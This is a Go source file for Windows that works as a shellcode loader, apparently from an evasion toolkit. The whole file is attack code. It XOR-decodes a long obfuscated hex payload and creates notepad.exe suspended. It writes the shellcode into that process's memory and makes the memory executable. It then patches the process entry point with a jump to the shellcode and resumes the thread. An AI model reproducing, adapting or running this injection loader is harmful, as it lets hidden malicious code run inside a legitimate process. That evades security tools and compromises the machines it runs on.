package main

import (
	_ "embed"
	"encoding/binary"
	"fmt"
	"golang.org/x/sys/windows"
	"strconv"
	"syscall"
	"unsafe"

	"encoding/hex"
)

type PEB struct {
	InheritedAddressSpace    byte
	ReadImageFileExecOptions byte
	BeingDebugged            byte
	reserved2                [1]byte
	Mutant                   uintptr
	ImageBaseAddress         uintptr
	Ldr                      uintptr
	ProcessParameters        uintptr
	reserved4                [3]uintptr
	AtlThunkSListPtr         uintptr
	reserved5                uintptr
	reserved6                uint32
	reserved7                uintptr
	reserved8                uint32
	AtlThunkSListPtr32       uint32
	reserved9                [45]uintptr
	reserved10               [96]byte
	PostProcessInitRoutine   uintptr
	reserved11               [128]byte
	reserved12               [1]uintptr
	SessionId                uint32
}

type ProcessBasicInformation struct {
	reserved1                    uintptr
	PebBaseAddress               uintptr
	reserved2                    [2]uintptr
	UniqueProcessId              uintptr
	InheritedFromUniqueProcessID uintptr
}

type ImageDosHeader struct {
	Magic    uint16
	Cblp     uint16
	Cp       uint16
	Crlc     uint16
	Cparhdr  uint16
	MinAlloc uint16
	MaxAlloc uint16
	SS       uint16
	SP       uint16
	CSum     uint16
	IP       uint16
	CS       uint16
	LfaRlc   uint16
	Ovno     uint16
	Res      [4]uint16
	OEMID    uint16
	OEMInfo  uint16
	Res2     [10]uint16
	LfaNew   int32
}

type ImageFileHeader struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type ImageOptionalHeader64 struct {
	Magic                       uint16
	MajorLinkerVersion          byte
	MinorLinkerVersion          byte
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               uintptr
}

type ImageOptionalHeader32 struct {
	Magic                       uint16
	MajorLinkerVersion          byte
	MinorLinkerVersion          byte
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	BaseOfData                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               uintptr
}
func Xor(src string) string {
	var XorKey = []byte{0x74, 0x69, 0x64, 0x65, 0x62, 0x79, 0x70, 0x61, 0x73, 0x73}   //tidesec
	var result string
	var s int64
	j := 0
	bt := []rune(src)
	for i := 0; i < len(src)/2; i++ {
		s, _ = strconv.ParseInt(string(bt[i*2:i*2+2]), 16, 0)
		result = result + string(byte(s)^XorKey[j])
		j = (j + 1) % 10
	}
	return result
}

func main() {
	var sc = "120a505d5a4a155515431151075d5249405143434058515456484551464141585153564143501741425c505d5a1b4553454340515c07574b4159474b4c0b5157504944594b11435b515556414007114440085004561d4350104a4051575401491102401042585306524b420241434058075401404005474244580754074b150546414058515456414803464146595c07564b4302474b44580055544f4850444b45515407524b475444414c0b5c555a41405143434459505d5a4c13514447425e505d5248145146434c0b505d534144554b1140595655564040501743115a515356411607104a40585c07514d4859474b44580053561d4350104a405157540149110247421758075c521d445043421758575d074947541542400a5456561a4255434b405c575c06484754174b415150515a1b44514147405054540649465747424c0b5406564144554b114059550656404050174340585c07524d4859474b44580055564845594742415151005740450047424151505457404450461240515c56071a42514742415b02030749455947424150510456414803424111505003041f16071515410d5204524944581116435e525c541c46584516425c535152494450464540505c5c074f44024b4a12585054001844024444465f5452041f1454474b4758075c564143501741400d5754014944054042175050545749445046434058060451184557444a155e0203064c150344404108505d5a401350474216515654524a40514343400d57540140445046424058515454184052474241585054001845564b4a4d0f0753041f145416114150510756414858104240515754064b44584b4a1051500151481358464142515455524b44514b47415b5157564812001611415c5600511b1607174640515c5c014f44594b40175a515554184000461540515c5c044844594b4a1008505c014e13511515120f0203041f4405404217505157574b44501112460d5453534147031515105c5c50014940074b464d0d545452494051474b120f0703521f48554b10445854555249150317401150015152484051434311510557041f16071515460f515d57414559464b4151515d524943544641420d5103551d11554217410c0554071d49551041100d06525b4115541147430f5d065348445816174c0c5503031a46571241450c0254501d13004410400a5104074843034147410d515303494059171510080252514842514443415f05075a4f11504a46420c54545a1d43504212470800535a4e46514243470b0057001845571240125b53045b4b14004343415c5356544c4753411740585252544c4604444747085655561d4607441242505206541a46504115475c560051494251414b425a5203541d47514542435d525c544b46024546470b5655561d4552474a405c5655514142044043470b5655574e46584516425d5203554e47524143400c51515049435641164758570750494555444142505251544c46044447460f5750501c4351414a440d540452491302474a4c0b5657531a41554b4210080704524012054a44465b5d51571f46511242465c065d5b1811574046120d0201551b43504746165d5104574c13594547400b5452071b42001042410c0654514e4656401045590655524a41574540465b015d534149514712105853525740435146414508005707404255434216595557561840041146415c0552044912511142425f5406561b15521715465b53000648455210164d515150071b1254104b435001505b1f4858151643515c03004047521742405d0206544b49024015405f02575218415142464c505d505340425744424508555d031b1250474b4c5e57510049145711164c5c5156504145041616155956525a4014514345170c5d550349125817404608060053184950424b475f5750071844074543420a0257521b4702474546590751534a1107404045085052504f4250414244595753571a11501042150a0507544b13024515160c565c011c42581215425c0750561c49574243435f5203564f45564a104608060155404854104b465a02015041110446154358015d0741165440444d0f0051064c4158154147585c5d5541495347114d5f5d5652491253414a450d5152071b40584612110d505c551d40514742160c0255004c11534645120f005056414350104a160854555249445143434058065d524941514343445950540040445143434459545556481200464b155d5156074c1607174640515d56574a4552474b4c50015256414858154240515c5c06184450114b4459565552494051474a4c50025c5648120042414d5f5c5c074b1607174640515c56014d42514b4617595351004f46574b11445e505d524813524b4617595350064e4559464b4151505d524c405143434459545557491352164b4d0f0201041f1607404247595600514b43504042460c5750514c4204404144595450044c15504343"
	scxor := Xor(sc)
	shellcode, _ := hex.DecodeString(scxor)
	program := "C:\\Windows\\System32\\notepad.exe"
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	NtQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")
	procInfo := &windows.ProcessInformation{}
	startupInfo := &windows.StartupInfo{
		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
		ShowWindow: 1,
	}
	appName, _ := syscall.UTF16PtrFromString(program)
	commandLine, _ := syscall.UTF16PtrFromString("")
	_ = windows.CreateProcess(
		appName,
		commandLine,
		nil,
		nil,
		true,
		windows.CREATE_SUSPENDED,
		nil,
		nil,
		startupInfo,
		procInfo,
	)
	addr, _, _ := VirtualAllocEx.Call(
		uintptr(procInfo.Process),
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE,
	)
	fmt.Println("ok")
	_, _, _ = WriteProcessMemory.Call(
		uintptr(procInfo.Process),
		addr,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)
	oldProtect := windows.PAGE_READWRITE
	_, _, _ = VirtualProtectEx.Call(
		uintptr(procInfo.Process),
		addr,
		uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	var processInformation ProcessBasicInformation
	var returnLength uintptr

	_, _, _ = NtQueryInformationProcess.Call(
		uintptr(procInfo.Process),
		0,
		uintptr(unsafe.Pointer(&processInformation)),
		unsafe.Sizeof(processInformation),
		returnLength,
	)
	ReadProcessMemory := kernel32.NewProc("ReadProcessMemory")

	var peb PEB
	var readBytes int32

	_, _, _ = ReadProcessMemory.Call(
		uintptr(procInfo.Process),
		processInformation.PebBaseAddress,
		uintptr(unsafe.Pointer(&peb)),
		unsafe.Sizeof(peb),
		uintptr(unsafe.Pointer(&readBytes)),
	)

	var dosHeader ImageDosHeader
	var readBytes2 int32

	_, _, _ = ReadProcessMemory.Call(
		uintptr(procInfo.Process),
		peb.ImageBaseAddress,
		uintptr(unsafe.Pointer(&dosHeader)),
		unsafe.Sizeof(dosHeader),
		uintptr(unsafe.Pointer(&readBytes2)),
	)

	var Signature uint32
	var readBytes3 int32

	_, _, _ = ReadProcessMemory.Call(
		uintptr(procInfo.Process),
		peb.ImageBaseAddress+uintptr(dosHeader.LfaNew),
		uintptr(unsafe.Pointer(&Signature)),
		unsafe.Sizeof(Signature),
		uintptr(unsafe.Pointer(&readBytes3)),
	)

	var peHeader ImageFileHeader
	var readBytes4 int32

	_, _, _ = ReadProcessMemory.Call(
		uintptr(procInfo.Process),
		peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature),
		uintptr(unsafe.Pointer(&peHeader)),
		unsafe.Sizeof(peHeader),
		uintptr(unsafe.Pointer(&readBytes4)),
	)

	var optHeader64 ImageOptionalHeader64
	var optHeader32 ImageOptionalHeader32
	var readBytes5 int32

	if peHeader.Machine == 34404 {
		_, _, _ = ReadProcessMemory.Call(
			uintptr(procInfo.Process),
			peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader),
			uintptr(unsafe.Pointer(&optHeader64)),
			unsafe.Sizeof(optHeader64),
			uintptr(unsafe.Pointer(&readBytes5)),
		)
	} else if peHeader.Machine == 332 {
		_, _, _ = ReadProcessMemory.Call(
			uintptr(procInfo.Process),
			peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader),
			uintptr(unsafe.Pointer(&optHeader32)),
			unsafe.Sizeof(optHeader32),
			uintptr(unsafe.Pointer(&readBytes5)),
		)
	}

	var ep uintptr
	if peHeader.Machine == 34404 {
		ep = peb.ImageBaseAddress + uintptr(optHeader64.AddressOfEntryPoint)
	} else if peHeader.Machine == 332 {
		ep = peb.ImageBaseAddress + uintptr(optHeader32.AddressOfEntryPoint)
	}

	var epBuffer []byte
	var shellcodeAddressBuffer []byte

	if peHeader.Machine == 34404 {
		epBuffer = append(epBuffer, byte(0x48))
		epBuffer = append(epBuffer, byte(0xb8))
		shellcodeAddressBuffer = make([]byte, 8)
		binary.LittleEndian.PutUint64(shellcodeAddressBuffer, uint64(addr))
		epBuffer = append(epBuffer, shellcodeAddressBuffer...)
	} else if peHeader.Machine == 332 {
		epBuffer = append(epBuffer, byte(0xb8))
		shellcodeAddressBuffer = make([]byte, 4) // 4 bytes for 32-bit address
		binary.LittleEndian.PutUint32(shellcodeAddressBuffer, uint32(addr))
		epBuffer = append(epBuffer, shellcodeAddressBuffer...)
	}

	epBuffer = append(epBuffer, byte(0xff))
	epBuffer = append(epBuffer, byte(0xe0))

	_, _, _ = WriteProcessMemory.Call(
		uintptr(procInfo.Process),
		ep,
		uintptr(unsafe.Pointer(&epBuffer[0])),
		uintptr(len(epBuffer)),
	)

	_, _ = windows.ResumeThread(procInfo.Thread)
	_ = windows.CloseHandle(procInfo.Process)
	_ = windows.CloseHandle(procInfo.Thread)
}
